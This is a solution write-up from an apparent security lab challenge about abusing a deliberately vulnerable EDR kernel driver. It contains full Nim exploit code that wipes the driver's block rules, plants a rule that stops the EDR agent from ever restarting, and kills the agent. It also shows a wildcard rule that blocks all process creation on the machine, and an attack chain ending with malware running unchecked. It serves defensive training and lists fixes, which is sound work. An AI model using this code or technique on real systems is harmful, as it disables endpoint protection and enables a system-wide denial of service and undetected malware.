---
title: "Solution 41: Block Rule Poisoning"
difficulty: medium
category: "IOCTL Abuse"
---

[Back to Challenge]({{ '/challenges/41-block-rule-poisoning/' | relative_url }})

## Overview

The driver's `IOCTL_ADD_BLOCK_RULE` accepts rules from any caller. A poisoned rule targeting `edr_agent.exe` causes the kernel to deny the agent's process creation at callback time — the agent can never restart. Combined with `IOCTL_KILL_PROCESS`, this is a permanent EDR takedown that survives until driver unload.

## Solution

```nim
# rule_poison.nim - block the EDR agent from ever restarting
import winim/lean

const
  DEVICE_PATH          = r"\\.\MostShittyEDR"
  IOCTL_KILL_PROCESS   = 0x222004'u32
  IOCTL_ADD_BLOCK_RULE = 0x222008'u32
  IOCTL_CLEAR_RULES    = 0x22200C'u32

type
  EdrCommand {.packed.} = object
    action: uint32
    processId: uint64

  BlockRuleEntry {.packed.} = object
    imageSuffix: array[260, WCHAR]
    cmdLineSubstr: array[512, WCHAR]

proc toWcharArray(dst: var openArray[WCHAR], src: string) =
  for i, c in src:
    if i >= dst.len - 1: break
    dst[i] = WCHAR(ord(c))
  dst[min(src.len, dst.len - 1)] = WCHAR(0)

proc findPid(name: string): DWORD =
  let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  if snap == INVALID_HANDLE_VALUE: return 0
  defer: CloseHandle(snap)
  var pe: PROCESSENTRY32
  pe.dwSize = DWORD(sizeof(PROCESSENTRY32))
  if Process32First(snap, &pe) != 0:
    while true:
      let exe = $cast[cstring](addr pe.szExeFile[0])
      if exe.toLowerAscii() == name.toLowerAscii():
        return pe.th32ProcessID
      if Process32Next(snap, &pe) == 0: break
  return 0

when isMainModule:
  let hDevice = CreateFileA(DEVICE_PATH,
    GENERIC_READ or GENERIC_WRITE,
    0, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
  if hDevice == INVALID_HANDLE_VALUE:
    echo "[-] Cannot open device"
    quit(1)
  defer: CloseHandle(hDevice)

  var bytesReturned: DWORD

  # Step 1: Clear all legitimate block rules
  echo "[*] Clearing existing block rules..."
  discard DeviceIoControl(hDevice, IOCTL_CLEAR_RULES,
    nil, 0, nil, 0, &bytesReturned, nil)
  echo "[+] All legitimate rules removed"

  # Step 2: Push poison rule — block edr_agent.exe
  echo "[*] Pushing poison rule: block edr_agent.exe..."
  var rule: BlockRuleEntry
  rule.imageSuffix.toWcharArray("edr_agent.exe")
  # cmdLineSubstr left empty = wildcard (matches everything)

  let ok = DeviceIoControl(hDevice, IOCTL_ADD_BLOCK_RULE,
    &rule, DWORD(sizeof(rule)), nil, 0, &bytesReturned, nil)
  if ok != 0:
    echo "[+] Poison rule active in kernel"
  else:
    echo "[-] Failed to add rule"
    quit(1)

  # Step 3: Kill the running agent
  let pid = findPid("edr_agent.exe")
  if pid != 0:
    echo "[*] Killing agent PID ", pid, "..."
    var cmd = EdrCommand(action: 1, processId: uint64(pid))
    discard DeviceIoControl(hDevice, IOCTL_KILL_PROCESS,
      &cmd, DWORD(sizeof(cmd)), nil, 0, &bytesReturned, nil)
    echo "[+] Agent killed"
  else:
    echo "[*] Agent not running (already dead?)"

  echo ""
  echo "[+] EDR agent is permanently blocked from restarting"
  echo "    The kernel will deny creation of edr_agent.exe"
  echo "    until the driver is unloaded or rules are cleared"
```

## Advanced: System-Wide DoS

A rule with both fields empty acts as a double-wildcard — it matches **every** process:

```nim
# WARNING: This blocks ALL process creation on the system
var dosRule: BlockRuleEntry
# imageSuffix[0] = 0  (already zero-initialized = wildcard)
# cmdLineSubstr[0] = 0 (already zero-initialized = wildcard)
discard DeviceIoControl(hDevice, IOCTL_ADD_BLOCK_RULE,
  &dosRule, DWORD(sizeof(dosRule)), nil, 0, &bytesReturned, nil)
# Now no process can start — only a reboot or driver unload fixes this
```

## Why It Works

The `HandleAddBlockRule` handler ([driver.cpp:584-616](../../src/driver/driver.cpp)) has three critical gaps:

1. **No caller validation**: Any process can add rules — not just the agent
2. **No rule content validation**: The driver doesn't check if a rule targets its own agent, system-critical processes (`csrss.exe`, `smss.exe`), or uses double-wildcards
3. **Rules survive agent death**: Block rules live in the kernel's `g_BlockRules` table, which persists until `IOCTL_CLEAR_BLOCK_RULES` or driver unload

The `ProcessCallback` ([driver.cpp:428-473](../../src/driver/driver.cpp)) evaluates rules synchronously at process creation. When the poisoned rule matches `edr_agent.exe`, `CreationStatus` is set to `STATUS_ACCESS_DENIED` — Windows reports "Access Denied" to whoever tried to start the agent.

A production EDR would fix this with:
- Reserved rule slots that cannot be overwritten by IOCTL
- A hardcoded self-exclusion in `MatchBlockRule` (never block the agent's own image)
- Authenticated rule management (signed rule payloads or caller PID verification)
- Rate limiting on rule additions

## Attack Chain

```
1. Open \\.\MostShittyEDR
2. IOCTL_CLEAR_BLOCK_RULES — remove legitimate protections
3. IOCTL_ADD_BLOCK_RULE — push rule blocking edr_agent.exe
4. IOCTL_KILL_PROCESS — kill the running agent
5. Agent is dead and can never restart
6. All malware runs unchecked — callbacks fire but nobody reads events
```

## How to Verify

1. Start the EDR: `.\edr_agent.exe --driver --verbose`
2. Run the poison tool — agent dies
3. Try to restart: `.\edr_agent.exe --driver --verbose` — "Access Denied"
4. The kernel `DbgPrint` output shows: `[MostShittyEDR-BLOCK] Blocked PID xxx via rule 0`
5. To restore: run a tool that sends `IOCTL_CLEAR_BLOCK_RULES`, then restart the agent
